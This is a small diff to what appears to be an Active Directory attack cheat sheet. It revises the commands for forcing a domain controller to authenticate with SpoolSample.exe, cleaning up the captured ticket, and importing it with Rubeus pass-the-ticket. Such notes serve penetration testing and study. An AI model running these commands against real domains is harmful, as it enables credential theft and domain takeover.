@@ -511,7 +511,7 @@ ls \\<DC>\pipe\spoolss
 
 #### Force authentication of the DC
 ```
-.\SpoolSample.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
+\SpoolSample.exe <DC FQDN> <TARGET SERVER WITH DELEGATION>
 ```
 
 #### Copy, save and trim the ticket
@@ -520,6 +520,7 @@ cat dc_ticket.txt | tr -d "\n" | tr -d " "
 ```
 
 #### Import the ticket
+- Paste the ticket from previous command
 ```
 .\Rubeus.exe ptt /ticket:<TICKET>
 ```
